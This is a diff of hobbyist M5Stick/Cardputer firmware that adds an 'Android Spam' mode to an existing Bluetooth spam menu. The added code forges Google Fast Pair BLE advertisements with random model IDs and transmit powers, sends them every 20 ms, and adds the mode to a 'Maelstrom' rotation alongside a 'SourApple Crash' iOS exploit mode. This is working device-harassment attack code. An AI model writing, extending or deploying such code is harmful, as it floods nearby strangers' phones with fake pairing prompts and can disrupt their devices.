@@ -2,13 +2,13 @@
 // github.com/n0xa | IG: @4x0nn
 
 // -=-=-=-=-=-=- Uncomment the platform you're building for -=-=-=-=-=-=-
-//#define STICK_C_PLUS
+#define STICK_C_PLUS
 //#define STICK_C_PLUS2
 //#define STICK_C
-#define CARDPUTER
+//#define CARDPUTER
 // -=-=- Uncommenting more than one at a time will result in errors -=-=-
 
-String buildver="2.0.5";
+String buildver="2.1.0";
 #define BGCOLOR BLACK
 #define FGCOLOR GREEN
 
@@ -118,6 +118,7 @@ int ajDelay = 1000;
 bool rstOverride = false; // Reset Button Override. Set to true when navigating menus.
 bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 bool swiftPair = false;   // Internal flag to place AppleJuice into Swift Pair random packet Mode
+bool androidPair = false; // Internal flag to place AppleJuice into Android Pair random packet Mode
 bool maelstrom = false;   // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
 #if defined(USE_EEPROM)
   #include <EEPROM.h>
@@ -796,9 +797,10 @@ void sendAllCodes() {
 /// Bluetooth Spamming ///
 /// BTSPAM MENU ///
 MENU btmenu[] = {
-  { "Back", 4},
+  { "Back", 5},
   { "AppleJuice", 0},
   { "Swift Pair", 1},
+  { "Android Spam", 4},
   { "SourApple Crash", 2},
   { "BT Maelstrom", 3},
 };
@@ -818,6 +820,7 @@ void btmenu_setup() {
   sourApple = false;
   swiftPair = false;
   maelstrom = false;
+  androidPair = false;
   rstOverride = true;
   btmenu_drawmenu();
   delay(500); // Prevent switching after menu loads up
@@ -871,6 +874,15 @@ void btmenu_loop() {
         DISP.print("\n\nNext: Exit");
         break;
       case 4:
+        androidPair = true;
+        current_proc = 9; // jump straight to appleJuice Advertisement
+        rstOverride = false;
+        isSwitching = true;
+        DISP.print("Android Spam");
+        DISP.print("\n\nNext: Exit");
+        break;
+
+      case 5:
         DISP.fillScreen(BGCOLOR);
         rstOverride = false;
         isSwitching = true;
@@ -1074,7 +1086,7 @@ void aj_adv(){
   // Isolating this to its own process lets us take advantage 
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
-  if (sourApple || swiftPair || maelstrom){
+  if (sourApple || swiftPair || androidPair || maelstrom){
     delay(20);   // 20msec delay instead of ajDelay for SourApple attack
     advtime = 0; // bypass ajDelay counter
   }
@@ -1136,6 +1148,31 @@ void aj_adv(){
       oAdvertisementData.addData(std::string((char *)packet, size));
       free(packet);
       free((void*)display_name);
+    } else if (androidPair) {
+      Serial.print("Android Spam Advertisement: ");
+      uint8_t packet[14];
+      uint8_t i = 0;
+      packet[i++] = 3;  // Packet Length
+      packet[i++] = 0x03; // AD Type (Service UUID List)
+      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+      packet[i++] = 0xFE; // ...
+      packet[i++] = 6; // Size
+      packet[i++] = 0x16; // AD Type (Service Data)
+      packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+      packet[i++] = 0xFE; // ...
+      const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
+      packet[i++] = (model >> 0x10) & 0xFF;
+      packet[i++] = (model >> 0x08) & 0xFF;
+      packet[i++] = (model >> 0x00) & 0xFF;
+      packet[i++] = 2; // Size
+      packet[i++] = 0x0A; // AD Type (Tx Power Level)
+      packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+
+      oAdvertisementData.addData(std::string((char *)packet, 14));
+      for (int i = 0; i < sizeof packet; i ++) {
+        Serial.printf("%02x", packet[i]);
+      }
+      Serial.println("");
     } else {
       Serial.print("AppleJuice Advertisement: ");
       if (deviceType >= 18){
@@ -1158,7 +1195,7 @@ void aj_adv(){
 #endif
   }
   if (check_next_press()) {
-    if (sourApple || swiftPair || maelstrom){
+    if (sourApple || swiftPair || androidPair || maelstrom){
       isSwitching = true;
       current_proc = 16;
       btmenu_drawmenu();
@@ -1304,11 +1341,19 @@ void btmaelstrom_loop(){
   aj_adv();
   if (maelstrom){
     swiftPair = true;
+    androidPair = false;
     sourApple = false;
     aj_adv();
   }
   if (maelstrom){
     swiftPair = false;
+    androidPair = true;
+    sourApple = false;
+    aj_adv();
+  }
+  if (maelstrom){
+    swiftPair = false;
+    androidPair = false;
     sourApple = false;
     aj_loop(); // roll a random device ID
     aj_adv();
